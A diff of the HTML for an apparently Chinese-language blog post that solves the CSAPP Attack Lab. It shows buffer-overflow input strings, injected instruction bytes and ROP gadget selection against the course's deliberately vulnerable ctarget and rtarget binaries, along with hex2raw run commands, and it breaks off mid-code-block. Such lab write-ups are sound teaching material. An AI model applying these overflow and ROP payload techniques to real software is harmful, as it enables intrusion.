@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/'>
 
-<link rel="stylesheet" href="/scss/style.min.1d7a77f66a9605dfbac1c7922a91290042c454a1166056d913fcbcea340dd583.css"><meta property='og:title' content="CSAPP:attack实验">
+<link rel="stylesheet" href="/scss/style.min.d14f29148164d1d66ef6b6850d7d5a6387f2b9f70026d09d858128fcb742f32c.css"><meta property='og:title' content="CSAPP:attack实验">
 <meta property='og:description' content="attack实验详细记录">
 <meta property='og:url' content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/'>
 <meta property='og:site_name' content='Lee'>
@@ -14,6 +14,8 @@
 <meta name="twitter:title" content="CSAPP:attack实验">
 <meta name="twitter:description" content="attack实验详细记录"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
 
 <link rel="stylesheet" href="https://s1.hdslb.com/bfs/static/jinkela/long/font/regular.css" />
     </head>
@@ -402,7 +404,7 @@
   <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
 </svg>
                 <time class="article-words">
-                    3735字
+                    3563字
                 </time>
         </div>
         
@@ -446,20 +448,7 @@
 </h3><p>通过输入字符串，利用栈溢出原理，将getbuf函数的返回地址改成touch1函数的入口地址</p>
 <p>注意字节顺序</p>
 <p>getbuf函数的反汇编代码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000004017a8 &lt;getbuf&gt;:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000004017a8 &lt;getbuf&gt;:
 </span></span><span class="line"><span class="cl">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
 </span></span><span class="line"><span class="cl">  4017ac:	48 89 e7             	mov    %rsp,%rdi
 </span></span><span class="line"><span class="cl">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;
@@ -468,37 +457,16 @@
 </span></span><span class="line"><span class="cl">  4017bd:	c3                   	ret    
 </span></span><span class="line"><span class="cl">  4017be:	90                   	nop
 </span></span><span class="line"><span class="cl">  4017bf:	90                   	nop
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>phase_1.txt文件</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span></code></pre></div><p>phase_1.txt文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">c0 17 40 00 00 00 00 00
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>运行命令</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt |./ctarget -q
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="level-2">Level 2
+</span></span></code></pre></div><p>运行命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt |./ctarget -q
+</span></span></code></pre></div><h3 id="level-2">Level 2
 </h3><p>level2需要将vlevel的值改成cookie值，再return到touch2函数入口处。</p>
 <p>修改后的rsp寄存器如下所示：</p>
 <p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2.png"
@@ -516,47 +484,16 @@
 	
 ></p>
 <p>phase_2.txt文件</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">48 c7 c7 fa 97 b9 59 68
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">48 c7 c7 fa 97 b9 59 68
 </span></span><span class="line"><span class="cl">ec 17 40 00 c3 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">78 dc 61 55 00 00 00 00
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>运行命令</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt <span class="p">|</span>./ctarget -q
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>结果</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Cookie: 0x59b997fa
+</span></span></code></pre></div><p>运行命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt <span class="p">|</span>./ctarget -q
+</span></span></code></pre></div><p>结果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Cookie: 0x59b997fa
 </span></span><span class="line"><span class="cl">Type string:Touch2!: You called touch2<span class="o">(</span>0x59b997fa<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Valid solution <span class="k">for</span> level <span class="m">2</span> with target ctarget
 </span></span><span class="line"><span class="cl">PASS: Would have posted the following:
@@ -564,27 +501,9 @@
 </span></span><span class="line"><span class="cl">        course  15213-f15
 </span></span><span class="line"><span class="cl">        lab     attacklab
 </span></span><span class="line"><span class="cl">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA <span class="m">97</span> B9 <span class="m">59</span> <span class="m">68</span> EC <span class="m">17</span> <span class="m">40</span> <span class="m">00</span> C3 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">78</span> DC <span class="m">61</span> <span class="m">55</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="level3">Level3
+</span></span></code></pre></div><h3 id="level3">Level3
 </h3><p>本题与上题类似，不同点在于传的参数是一个字符串。先给出<code>touch3</code>的C语言代码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
@@ -596,23 +515,8 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><code>touch3</code>中调用了<code>hexmatch</code>，它的C语言代码为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Compare string to hex represention of unsigned value */</span>
+</span></span></code></pre></div><p><code>touch3</code>中调用了<code>hexmatch</code>，它的C语言代码为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Compare string to hex represention of unsigned value */</span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
@@ -621,9 +525,7 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>也就是说，要把<code>cookie</code>转换成对应的字符串传进去</p>
+</span></span></code></pre></div><p>也就是说，要把<code>cookie</code>转换成对应的字符串传进去</p>
 <p>注意第6行，<code>s</code>的位置是随机的，我们写在<code>getbuf</code>栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。</p>
 <p>因此，考虑把<code>cookie</code>的字符串数据存在<code>test</code>的栈上，其它部分与上题相同，这里不再重复思路。</p>
 <h3 id="注入代码">注入代码
@@ -639,38 +541,17 @@
 	
 ></p>
 <p><code>0x5561dca8</code>，这就是字符串存放的位置，也是调用<code>touch3</code>应该传入的参数，又<code>touch3</code>代码的地址为<code>4018fa</code>。从而得到代码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4018fa</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>字节级表示为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
+</span></span></code></pre></div><p>字节级表示为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="mo">0000000000000000</span> <span class="o">&lt;</span><span class="p">.</span><span class="n">text</span><span class="o">&gt;:</span>
 </span></span><span class="line"><span class="cl">   <span class="mi">0</span><span class="o">:</span>   <span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span>    <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl">   <span class="mi">7</span><span class="o">:</span>   <span class="mi">68</span> <span class="n">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span>          <span class="n">pushq</span>  <span class="err">$</span><span class="mh">0x4018fa</span>
 </span></span><span class="line"><span class="cl">   <span class="nl">c</span><span class="p">:</span>   <span class="n">c3</span>                      <span class="n">retq</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="栈帧讲解">栈帧讲解
+</span></span></code></pre></div><h3 id="栈帧讲解">栈帧讲解
 </h3><p>我们期望的栈帧为</p>
 <p><img src="https://pic4.zhimg.com/80/v2-dcd7fd081b2c60ed0443adfa044fbb27_1440w.webp"
 	
@@ -692,27 +573,14 @@
 </h3><p>cookie<code>0x59b997fa</code>作为字符串转换为<code>ASCII</code>为：<code>35 39 62 39 39 37 66 61</code></p>
 <p>注入代码段的地址与上题一样，同样为<code>0x5561dc78</code></p>
 <p>由于在<code>test</code>栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的<code>ASCII</code> 。于是得到如下输入：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mi">68</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mi">68</span> 
 </span></span><span class="line"><span class="cl"><span class="n">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span> <span class="n">c3</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
 </span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
 </span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
 </span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
 </span></span><span class="line"><span class="cl"><span class="mi">78</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
 </span></span><span class="line"><span class="cl"><span class="mi">35</span> <span class="mi">39</span> <span class="mi">62</span> <span class="mi">39</span> <span class="mi">39</span> <span class="mi">37</span> <span class="mi">66</span> <span class="mi">61</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://pic3.zhimg.com/80/v2-02b3d0c6b65d967b6c66cbbc2ec0d2de_1440w.webp"
+</span></span></code></pre></div><p><img src="https://pic3.zhimg.com/80/v2-02b3d0c6b65d967b6c66cbbc2ec0d2de_1440w.webp"
 	
 	
 	
@@ -769,79 +637,32 @@
 ></p>
 <p><strong>举个例子：</strong></p>
 <p><code>rtarget</code>有这样一个函数：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">setval_210</span><span class="p">(</span><span class="kt">unsigned</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">setval_210</span><span class="p">(</span><span class="kt">unsigned</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">3347663060U</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>它的汇编代码字节级表示为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">0000000000400f</span><span class="mi">15</span> <span class="o">&lt;</span><span class="n">setval_210</span><span class="o">&gt;:</span>
+</span></span></code></pre></div><p>它的汇编代码字节级表示为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">0000000000400f</span><span class="mi">15</span> <span class="o">&lt;</span><span class="n">setval_210</span><span class="o">&gt;:</span>
 </span></span><span class="line"><span class="cl">    <span class="mf">400f</span><span class="mi">15</span><span class="o">:</span> <span class="n">c7</span> <span class="mo">07</span> <span class="n">d4</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span>   <span class="n">movl</span> <span class="err">$</span><span class="mh">0xc78948d4</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="mf">400f</span><span class="mi">1</span><span class="nl">b</span><span class="p">:</span> <span class="n">c3</span>                  <span class="n">retq</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>查表可知，取其中一部分字节序列 48 89 c7 就表示指令<code>movq %rax, %rdi</code>，这整句指令的地址为<code>0x400f15</code>，于是从<code>0x400f18</code>开始的代码就可以变成下面这样：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
+</span></span></code></pre></div><p>查表可知，取其中一部分字节序列 48 89 c7 就表示指令<code>movq %rax, %rdi</code>，这整句指令的地址为<code>0x400f15</code>，于是从<code>0x400f18</code>开始的代码就可以变成下面这样：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这个小片段就可以作为一个<code>gadget</code>为我们所用。</p>
+</span></span></code></pre></div><p>这个小片段就可以作为一个<code>gadget</code>为我们所用。</p>
 <p>其它一些可以利用的代码都在文件<code>farm.c</code>中展示了出来</p>
 <h3 id="level1">level1
 </h3><p>本题的任务和phase2相同，都是要求返回到touch2函数，phase2中用到的注入代码为</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4017ec</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>由于我们无法找到这个特定值的gadget，所以我们可以先将我们需要的值写入栈中，再利用pop命令将其pop到rdi寄存器中，最后再返回touch2的函数起始地址，任务便完成。</p>
+</span></span></code></pre></div><p>由于我们无法找到这个特定值的gadget，所以我们可以先将我们需要的值写入栈中，再利用pop命令将其pop到rdi寄存器中，最后再返回touch2的函数起始地址，任务便完成。</p>
 <p>但是farm中找不到pop到rdi寄存器指令的gadget，所以我们另辟蹊径，先pop到rax中，再mov %rax，%rdi，即</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">popq</span> <span class="o">%</span><span class="n">rax</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">popq</span> <span class="o">%</span><span class="n">rax</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#############
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">mov</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w.webp"
+</span></span></code></pre></div><p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w.webp"
 	width="1241"
 	height="726"
 	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu2488226402346328207.webp 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu10118464121499149602.webp 1024w"
@@ -864,57 +685,19 @@
 <h3 id="solution-1">Solution
 </h3><p>首要问题是找到我们需要的<code>gadget</code></p>
 <p>先用如下指令得到<code>target</code>的汇编代码及字节级表示</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">objdump -d rtarget &gt; rtarget.s
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>查表知，<code>pop %rax</code>用<code>58</code>表示，于是查找<code>58</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">a7</span> <span class="o">&lt;</span><span class="n">addval_219</span><span class="o">&gt;:</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">objdump -d rtarget &gt; rtarget.s
+</span></span></code></pre></div><p>查表知，<code>pop %rax</code>用<code>58</code>表示，于是查找<code>58</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">a7</span> <span class="o">&lt;</span><span class="n">addval_219</span><span class="o">&gt;:</span>
 </span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">a7</span><span class="p">:</span>       <span class="mi">8</span><span class="n">d</span> <span class="mi">87</span> <span class="mi">51</span> <span class="mi">73</span> <span class="mi">58</span> <span class="mi">90</span>       <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x6fa78caf</span><span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
 </span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">ad</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>                   <span class="n">retq</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>得到指令地址为<code>0x4019ab</code></p>
+</span></span></code></pre></div><p>得到指令地址为<code>0x4019ab</code></p>
 <p><code>movq %rax, %rdi</code>表示为<code>48 89 c7</code>，刚好能找到！其中 90 表示“空”，可以忽略</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">c3</span> <span class="o">&lt;</span><span class="n">setval_426</span><span class="o">&gt;:</span>
